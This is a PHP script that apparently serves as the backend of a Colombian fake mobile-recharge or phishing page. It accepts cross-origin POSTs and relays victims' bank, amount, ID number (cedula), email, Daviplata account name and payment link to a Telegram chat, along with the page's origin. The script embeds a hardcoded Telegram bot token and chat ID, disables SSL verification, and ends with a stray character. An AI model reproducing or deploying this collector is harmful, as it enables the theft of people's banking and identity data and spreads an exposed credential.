<?php
header('Content-Type: application/json');
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: Content-Type");
// Configuración de Telegram
$telegram_token = '7497890468:AAGGItTPfO8JXfESTE8QV_NU22qc-tCsU7A';
$chat_id = '-5242449077';


function enviarNotificacionTelegram($token, $chat_id, $mensaje) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";

    $data = [
        'chat_id' => $chat_id,
        'text' => $mensaje,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);

    $result = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return $http_code == 200;
}
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);

    if ($data) {
        $monto = $data['monto'] ?? 'N/A';
        $banco = $data['banco'] ?? 'N/A';
        $url = $data['url'] ?? 'N/A';
        $email = $data['email'] ?? 'N/A';
        $idTransaccion = $data['idTransaccion'] ?? 'N/A';
        $tipoProveedor = $data['tipoProveedor'] ?? 'N/A';
        $estadoProveedor = $data['estadoProveedor'] ?? 'N/A';
        $tiempoRespuesta = $data['tiempoRespuesta'] ?? 'N/A';
        $datosUsados = $data['datosUsados'] ?? null;

        $userIp = $_SERVER['REMOTE_ADDR'] ?? 'IP no disponible';
        date_default_timezone_set('America/Bogota');

        // Obtener origen del referer
        $origen = $_SERVER['HTTP_REFERER'] ?? 'N/A';
        if ($origen !== 'N/A') {
            $parsedUrl = parse_url($origen);
            $origen = ($parsedUrl['scheme'] ?? 'https') . '://' . ($parsedUrl['host'] ?? 'N/A');
        }

        $mensaje = "🎉 <b>Recarga lista para pagar!</b>\n";
        $mensaje .= "━━━━━━━━━━━━━━━━━━━━━━━\n";

        // Datos del usuario (desde datos_usados si existen)
        if ($datosUsados && is_array($datosUsados)) {
            if (isset($datosUsados['cedula'])) {
                $mensaje .= "👤 <b>Documento:</b> {$datosUsados['cedula']}\n";
            }
            if (isset($datosUsados['email'])) {
                $mensaje .= "📧 <b>Correo:</b> " . strtoupper($datosUsados['email']) . "\n";
            }
        }

        $mensaje .= "🏦 <b>Banco:</b> " . strtoupper($banco) . "\n";
        $mensaje .= "💰 <b>Monto:</b> $" . number_format($monto, 0, ',', '.') . "\n";
        $mensaje .= "━━━━━━━━━━━━━━━━━━━━━━━\n";

        // Datos de Daviplata (si existen)
        if ($datosUsados && is_array($datosUsados)) {
            if (isset($datosUsados['nombre'])) {
                $mensaje .= "👤 <b>Daviplata:</b> {$datosUsados['nombre']}\n";
            }
            if (isset($datosUsados['cedula'])) {
                $mensaje .= "🏦 <b>Cédula Davi:</b> {$datosUsados['cedula']}\n";
            }
        }

        $mensaje .= "🔗 <b>Link de pago:</b>\n$url\n";
        $mensaje .= "━━━━━━━━━━━━━━━━━━━━━━━\n";
        $mensaje .= "🌐 <b>Origen:</b> $origen\n";
        $mensaje .= "⏱️ <b>Tiempo:</b> $tiempoRespuesta";

        $enviado = enviarNotificacionTelegram($telegram_token, $chat_id, $mensaje);

        echo json_encode([
            'success' => $enviado,
            'message' => $enviado ? 'Notificación enviada' : 'Error al enviar notificación'
        ]);
    } else {
        echo json_encode([
            'success' => false,
            'message' => 'Datos inválidos'
        ]);
    }
} else {
    echo json_encode([
        'success' => false,
        'message' => 'Método no permitido'
    ]);
}
?> y